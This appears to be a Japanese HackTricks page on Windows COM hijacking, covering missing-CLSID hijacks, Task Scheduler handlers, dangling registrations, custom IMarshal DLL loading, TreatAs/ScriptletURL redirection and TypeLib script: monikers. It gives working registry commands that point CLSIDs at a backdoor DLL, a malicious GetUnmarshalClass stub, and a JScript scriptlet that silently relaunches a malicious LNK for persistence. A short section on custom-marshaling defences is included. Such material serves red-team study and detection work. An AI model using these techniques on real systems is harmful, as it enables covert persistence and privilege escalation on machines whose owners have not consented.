# COM Hijacking

{{#include ../../banners/hacktricks-training.md}}

### 存在しない COM コンポーネントを検索する

HKCU の値はユーザーが変更できるため、**COM Hijacking** は**永続化の手段**として利用できます。`procmon` を使えば、まだ存在せず、攻撃者が作成できる COM レジストリキーを簡単に見つけられます。基本的なフィルターは次のとおりです。

- **RegOpenKey** 操作。
- _Result_ が **NAME NOT FOUND**。
- _Path_ が **InprocServer32** で終わる。

調査時に役立つ追加の方法:

- **`LocalServer32`** キーの欠落も探します。一部の COM クラスはプロセス外サーバーであり、DLL ではなく攻撃者が制御する EXE を起動します。
- `InprocServer32` に加えて、**`TreatAs`** と **`ScriptletURL`** のレジストリ操作も検索します。最近の検出ルールやマルウェアの分析記事でこれらが繰り返し取り上げられているのは、通常の COM 登録よりはるかに珍しく、検出精度が高いためです。
- HKCU に登録を複製する際は、元の `HKLM\Software\Classes\CLSID\{CLSID}\InprocServer32` から正規の **`ThreadingModel`** をコピーします。誤ったモデルを使うと、アクティベーションが失敗し、Hijacking が目立つことがあります。<sup>[[3]](#references)</sup>
- 64 ビットシステムでは、64 ビットと 32 ビットの両方のビュー（`procmon.exe` と `procmon64.exe`、`HKLM\Software\Classes` と `HKLM\Software\Classes\WOW6432Node`）を確認します。32 ビットアプリケーションは、異なる COM 登録を解決することがあるためです。

偽装する存在しない COM を決めたら、次のコマンドを実行します。_数秒ごとに読み込まれる COM を偽装すると過剰な対応になることがあるため、注意してください。_

```bash
New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
```

### Hijackable Task Scheduler COM components

Windows Tasks は Custom Triggers を使って COM オブジェクトを呼び出します。Task Scheduler 経由で実行されるため、トリガーされるタイミングを予測しやすくなります。

<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
$Tasks = Get-ScheduledTask

foreach ($Task in $Tasks)
{
  if ($Task.Actions.ClassId -ne $null)
  {
    if ($Task.Triggers.Enabled -eq $true)
    {
      $usersSid = "S-1-5-32-545"
      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }

      if ($Task.Principal.GroupId -eq $usersGroup)
      {
        Write-Host "Task Name: " $Task.TaskName
        Write-Host "Task Path: " $Task.TaskPath
        Write-Host "CLSID: " $Task.Actions.ClassId
        Write-Host
      }
    }
  }
}

# Sample Output:
<strong># Task Name:  Example
</strong># Task Path:  \Microsoft\Windows\Example\
# CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
# [more like the previous one...]</code></pre>

出力を確認すれば、たとえば**ユーザーがログインするたびに**実行されるものを選べます。

次に、**{1936ED8A-BD93-3213-E325-F38D112938EF}** を **HKEY\CLASSES\ROOT\CLSID**、HKLM、HKCU で検索すると、通常、HKCU にその値が存在しないことがわかります。

```bash
# Exists in HKCR\CLSID\
Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"

Name           Property
----           --------
InprocServer32 (default)      : C:\Windows\system32\some.dll
               ThreadingModel : Both

# Exists in HKLM
Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize

Name                                   Property
----                                   --------
{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1} (default) : MsCtfMonitor task handler

# Doesn't exist in HKCU
PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
```

その後、HKCU エントリを作成するだけで、ユーザーがログインするたびにバックドアが起動します。

## Dangling COM Registrations and Custom Marshaling

マシン全体に適用される COM 登録は、レジストリを変更しなくても DLL-planting の足がかりになることがあります。DLL が存在せず、かつ低権限ユーザーが最終パスを作成または変更できる `InprocServer32` 値を探します。正確な DLL 名でファイルを配置すると、その CLSID をアクティブ化したプロセスは攻撃者のコードを読み込みます。CrossDevice の例では、登録されたパスは `%PROGRAMDATA%\CrossDevice\CrossDevice.Streaming.Source.dll` だったため、標準ユーザーが不足している子ディレクトリと DLL を作成できました。<sup>[[5]](#references)</sup>

### 特権 COM アクティベーション経路としての書き込み可能なプラグインマップ

書き込み可能なプラグイン ID と CLSID の対応マップがあると、クラスのマシン全体に適用される登録を編集できなくても、低権限ユーザーが特権サービスに読み込ませるインプロセス COM サーバーを選択できることがあります。<sup>[[8]](#references)[[9]](#references)</sup> 報告された Windows 11 の `InstallService` の事例では、標準ユーザーが `StaticPluginMap` を変更できました。組み込みではないプラグイン ID によって、`LocalSystem` サービスが `CLSCTX_INPROC_SERVER` と `IID_IInstallServicePlugin` を指定して `CoCreateInstance` に渡す CLSID を選択できました。<sup>[[8]](#references)[[9]](#references)</sup> 登録された DLL は、別の COM ホストではなくサービスプロセス内に読み込まれます。<sup>[[10]](#references)</sup>

該当する条件は、マップへの実効的な書き込み権限、到達可能なプラグイン要求、そして低権限ユーザーが制御できる `InprocServer32` DLL パスです。<sup>[[8]](#references)[[9]](#references)</sup> 上述の CrossDevice 登録は、報告された事例でパスの条件を満たしていました。<sup>[[8]](#references)[[9]](#references)</sup> プラグインオブジェクトが成功するには、要求されたインターフェースを公開する必要があります。しかし、`CoCreateInstance` が完了する前に DLL は読み込まれるため、そのインターフェースを公開できなくても、それだけで読み込み時のコード実行が否定されるわけではありません。<sup>[[8]](#references)[[11]](#references)</sup> このサービスディスパッチ経路は、以下のカスタム `IMarshal` 経路とは異なります。別のファイルパスを利用する手法については、[DLL Hijacking](dll-hijacking/) を参照してください。

### プロセス間 DLL 読み込みプリミティブとしての `IMarshal`

COM は通常、インターフェースポインターを標準の `OBJREF` で表し、受信側が元のオブジェクトを参照するようにします。`IMarshal` を実装するオブジェクトは、代わりにカスタム `OBJREF` を生成できます。その `GetUnmarshalClass` メソッドは、受信側プロセスでオブジェクトを再構築するコードの CLSID を指定します。この CLSID は元のオブジェクトを特定するものである必要はありません。COM はこれをインプロセスサーバーとして解決し、要求されたインターフェースメソッドをディスパッチする前に、登録された DLL を読み込みます。<sup>[[5]](#references)[[6]](#references)[[7]](#references)</sup>

最小限の悪意ある実装では、`GetUnmarshalClass` 内のダングリング CLSID を置き換えるだけで済みます。<sup>[[5]](#references)</sup>

```c
HRESULT STDMETHODCALLTYPE GetUnmarshalClass(
    REFIID riid, void *pv, DWORD dest_context,
    void *dest_context_ptr, DWORD flags, CLSID *clsid) override
{
    return CLSIDFromString(L"{DANGLING-CLSID}", clsid);
}
```

このオブジェクトを、`[in] IUnknown *` などのプロキシ経由のメソッドパラメーターとして渡します。別の方法として、`CoGetInstanceFromIStorage` を使い、カスタムマーシャリングされるオブジェクトにローカルチェックを通過できるだけの `IStorage` も実装させます。リモートサーバーで自動的にアンマーシャリングされる際に、置き換えた CLSID が解決されるため、対象メソッドの実行前に DLL がロードされます。<sup>[[5]](#references)</sup>

この手法は、登録が欠落している場合に限りません。受信側に既存のカスタムアンマーシャラー DLL をロードさせ、そのロード処理やアンマーシャリング処理のバグを露呈させることもできます。<sup>[[5]](#references)</sup>

この手法を成立させるには、以下の条件がすべて必要です。<sup>[[5]](#references)</sup>

1. マシン全体から参照可能な CLSID が、欠落しているか置き換え可能なインプロセス DLL を指している。
2. 攻撃者が、その DLL を解決されたパスに配置できる。
3. アクティベート可能なアウトオブプロセス COM サーバーが、目的の権限レベルで実行されている。
4. サーバーがカスタムマーシャリングを受け入れ、プロセス境界を越えて攻撃者のオブジェクトを渡すプロキシ呼び出しを公開している。

### ダングリングしたインプロセスサーバーを探す

[OleViewDotNet](https://github.com/tyranid/oleviewdotnet) と [NtObjectManager](https://github.com/googleprojectzero/sandbox-attacksurface-analysis-tools) を使うと、マシンの COM データベースを列挙し、通常の Win32 モジュール解決を通じて各サーバーをテストできます。登録にファイル名だけが含まれ、ローダーの検索パスに依存している場合があるため、`Test-Path` よりもこの方法が適しています。<sup>[[5]](#references)</sup>

```powershell
function Test-ComServer($Server) {
    try {
        Use-NtObject ($lib = Import-Win32Module -Path $Server -Flags AsDataFile) { $true }
    } catch { $false }
}

$db = Get-ComDatabase -LoadMode MachineOnly
$classes = Get-ComClass -Database $db -ServerType InProcServer32
$classes | Where-Object { -not (Test-ComServer $_.DefaultServer) } |
    Sort-Object DefaultServer | Select-Object Name, DefaultServer
```

結果は悪用可能性の証明ではなく、候補リストとして扱ってください。ローダーと同じ方法でパスを解決し、最初に存在する親ディレクトリと、すでに存在する場合は対象の DLL の DACL を調べます。ファイルが存在しないことが有用なのは、攻撃者が COM に実際に解決されるパスを作成または置き換えられる場合に限られます。<sup>[[5]](#references)</sup>

### 特権を持つ受信側を選択して起動する

候補となる COM クラスについて、`RunAs`、サービスとの関連付け、利用可能なインターフェース、RPC プロキシを調べます。`SYSTEM` 用に設定されていても、名前付きサービスに関連付けられていないクラスは、RPCSS が起動できないため、直接アクティブ化に失敗することがあります。その場合は、実行可能なスケジュールされたタスクなど、ホストを起動する非特権のトリガーを探し、サーバーを稼働状態に保つために必要な名前付きイベントや IPC の前提条件を再現します。<sup>[[5]](#references)</sup>

たとえば、脆弱な Shell Create Object Handler のチェーンは、ユーザーが実行可能なスケジュールされたタスクを呼び出す前に、想定されるグローバルイベントを作成してホストを起動していました。<sup>[[5]](#references)</sup>

```powershell
$ev = New-NtEvent -Win32Path 'Global\ShellCreateObjectTaskReadyEvent' -InitialState $false
Start-ScheduledTask -TaskPath '\Microsoft\Windows\Shell\' -TaskName 'CreateObjectTask'
$ev.Wait()
$object = New-ComObject -Clsid '135fd325-45b7-4c30-89f8-4386961669f0'
```

生成されたオブジェクト参照をホストに対応付け、IDとマーシャリングポリシーの両方を検証します。次に、インターフェースを列挙し、そのプロキシをIDLに変換して、偽のオブジェクトをマーシャリングする `IUnknown *` などの入力パラメーターを探します。<sup>[[5]](#references)</sup>

```powershell
$objref = Get-ComObjRef -Object $object
Get-ComProcess -ProcessId $objref.ProcessId |
    Select-Object Name, User, CustomMarshalAllowed

Get-ComInterface -Object $object
Get-ComInterface -Name '<interface>' | ConvertTo-ComSourceCode -Parse
```

### カスタムマーシャリングの保護

適切な受信側は、信頼されていないカスタムマーシャラーを拒否する必要があります。プロセス全体に適用される保護策として、`CoInitializeSecurity` に渡す capabilities に `EOAC_NO_CUSTOM_MARSHAL` を指定する方法と、`IGlobalOptions::Set` を通じて `COMGLB_UNMARSHALING_POLICY_STRONG` を設定する方法があります。シンボルが利用できる場合は、対応する状態を `combase!gCapabilities` と `combase!g_GLBOPT_UnmarshalingPolicy` で確認できます。NtObjectManager は、プロセスパーサーがその Windows ビルドに対応している場合、結果を `CustomMarshalAllowed` として公開します。<sup>[[5]](#references)</sup>

---

## COM TreatAs Hijacking + ScriptletURL

`TreatAs` を使うと、ある CLSID を別の CLSID でエミュレートできます。<sup>[[4]](#references)</sup> 攻撃の観点では、元の CLSID には手を加えず、`scrobj.dll` を指す2つ目のユーザー単位の CLSID を作成し、`HKCU\Software\Classes\CLSID\{Victim}\TreatAs` で実際の COM オブジェクトを悪意のある CLSID にリダイレクトできます。

次のような場合に有用です。

- 対象アプリケーションが、ログオン時またはアプリ起動時に、すでに安定した CLSID をインスタンス化している
- 元の `InprocServer32` を置き換えずに、レジストリだけでリダイレクトしたい
- `ScriptletURL` 値を通じて、ローカルまたはリモートの `.sct` scriptlet を実行したい

ワークフローの例（公開されている Atomic Red Team の tradecraft と、以前の COM レジストリ悪用に関する調査をもとに作成）：

```cmd
:: 1. Create a malicious per-user COM class backed by scrobj.dll
reg add "HKCU\Software\Classes\AtomicTest" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\AtomicTest\CLSID" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}" /ve /t REG_SZ /d "AtomicTest" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /ve /t REG_SZ /d "C:\Windows\System32\scrobj.dll" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\InprocServer32" /v "ThreadingModel" /t REG_SZ /d "Apartment" /f
reg add "HKCU\Software\Classes\CLSID\{00000001-0000-0000-0000-0000FEEDACDC}\ScriptletURL" /ve /t REG_SZ /d "file:///C:/ProgramData/atomic.sct" /f

:: 2. Redirect a high-frequency CLSID to the malicious class
reg add "HKCU\Software\Classes\CLSID\{97D47D56-3777-49FB-8E8F-90D7E30E1A1E}\TreatAs" /ve /t REG_SZ /d "{00000001-0000-0000-0000-0000FEEDACDC}" /f
```

Notes:

- `scrobj.dll` は `ScriptletURL` の値を読み取り、参照先の `.sct` を実行するため、payload はローカルファイルとして保持することも、HTTP/HTTPS 経由でリモートから取得することもできます。
- 元の COM 登録が HKLM に完全かつ安定して存在する場合、`TreatAs` は特に便利です。ツリー全体を複製する代わりに、ユーザーごとの小さなリダイレクトだけで済みます。
- 自然なトリガーを待たずに検証するには、対象クラスが STA activation をサポートしている場合、`rundll32.exe -sta <ProgID-or-CLSID>` で偽の ProgID/CLSID を手動でインスタンス化できます。

## COM TypeLib Hijacking (script: moniker persistence)

Type Library (TypeLib) は COM interfaces を定義し、`LoadTypeLib()` 経由で読み込まれます。COM server がインスタンス化されると、OS は `HKCR\TypeLib\{LIBID}` 配下の registry keys を参照して、関連する TypeLib も読み込むことがあります。TypeLib のパスを **moniker**（例: `script:C:\...\evil.sct`）に置き換えると、TypeLib の解決時に Windows が scriptlet を実行し、よく使われるコンポーネントにアクセスしたときにトリガーされる、ステルス性の高い persistence が実現します。

これは Microsoft Web Browser control（Internet Explorer、WebBrowser を埋め込んだアプリ、さらには `explorer.exe` でも頻繁に読み込まれる）に対して確認されています。<sup>[[1]](#references)[[2]](#references)</sup>

### 手順 (PowerShell)

1) 高頻度で使われる CLSID が使用する TypeLib (LIBID) を特定します。マルウェアの chain で悪用されることが多い CLSID の例: `{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}`（Microsoft Web Browser）。

```powershell
$clsid = '{EAB22AC0-30C1-11CF-A7EB-0000C05BAE0B}'
$libid = (Get-ItemProperty -Path "Registry::HKCR\\CLSID\\$clsid\\TypeLib").'(default)'
$ver   = (Get-ChildItem "Registry::HKCR\\TypeLib\\$libid" | Select-Object -First 1).PSChildName
"CLSID=$clsid  LIBID=$libid  VER=$ver"
```

2) `script:` monikerを使用して、ユーザーごとのTypeLibパスをローカルのscriptletに向けます（管理者権限は不要）：

```powershell
$dest = 'C:\\ProgramData\\Udate_Srv.sct'
New-Item -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Force | Out-Null
Set-ItemProperty -Path "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver\\0\\win32" -Name '(default)' -Value "script:$dest"
```

3) メインの payload（初期チェーンで使用する `.lnk` など）を再起動する、最小限の JScript `.sct` を配置します：

```xml
<?xml version="1.0"?>
<scriptlet>
  <registration progid="UpdateSrv" classid="{F0001111-0000-0000-0000-0000F00D0001}" description="UpdateSrv"/>
  <script language="JScript">
    <![CDATA[
      try {
        var sh = new ActiveXObject('WScript.Shell');
        // Re-launch the malicious LNK for persistence
        var cmd = 'cmd.exe /K set X=1&"C:\\ProgramData\\NDA\\NDA.lnk"';
        sh.Run(cmd, 0, false);
      } catch(e) {}
    ]]>
  </script>
</scriptlet>
```

4) トリガー – IE、WebBrowser control を埋め込んだアプリケーション、あるいは通常の Explorer 操作を行うと、TypeLib が読み込まれて scriptlet が実行され、ログオン/再起動時にチェーンが再び有効になります。

クリーンアップ
```powershell
# Remove the per-user TypeLib hijack
Remove-Item -Recurse -Force "HKCU:Software\\Classes\\TypeLib\\$libid\\$ver" 2>$null
# Delete the dropped scriptlet
Remove-Item -Force 'C:\\ProgramData\\Udate_Srv.sct' 2>$null
```

メモ
- 同じロジックを他の高頻度で使用される COM コンポーネントにも適用できます。まず `HKCR\CLSID\{CLSID}\TypeLib` から実際の `LIBID` を必ず解決してください。
- 64-bit システムでは、64-bit の利用者向けに `win64` サブキーも設定できます。

## References

- [1] [TypeLib のハイジャック – 新しい COM 永続化手法 (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)
- [2] [Check Point Research – ZipLine Campaign: 米国企業を標的とした高度なフィッシング攻撃](https://research.checkpoint.com/2025/zipline-phishing-campaign/)
- [3] [COM Hijacking の再検討 (SpecterOps)](https://specterops.io/blog/2025/05/28/revisiting-com-hijacking/)
- [4] [CLSID キー (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/com/clsid-key-hklm)
- [5] [Project Zero - Windows Exploitation Techniques: 孤立した COM オブジェクトの登録](https://projectzero.google/2026/09/windows-dangling-com.html)
- [6] [Microsoft Learn - IMarshal インターフェイス](https://learn.microsoft.com/en-us/windows/win32/api/objidl/nn-objidl-imarshal)
- [7] [Microsoft Open Specifications - MS-DCOM OBJREF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-dcom/fe6c5e46-adf8-4e34-a8de-3f756c875f31)
- [8] [Dark Elevator PoC と技術解説 (califio)](https://github.com/califio/publications/tree/main/MADBugs/windows-CVE-2026-50343)
- [9] [Dark Elevator: Windows Install Service のローカル権限昇格 (calif.io)](https://blog.calif.io/p/dark-elevator-windows-install-service)
- [10] [CLSCTX の列挙 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/wtypesbase/ne-wtypesbase-clsctx)
- [11] [CoCreateInstance 関数 (Microsoft Learn)](https://learn.microsoft.com/en-us/windows/win32/api/combaseapi/nf-combaseapi-cocreateinstance)
{{#include ../../banners/hacktricks-training.md}}

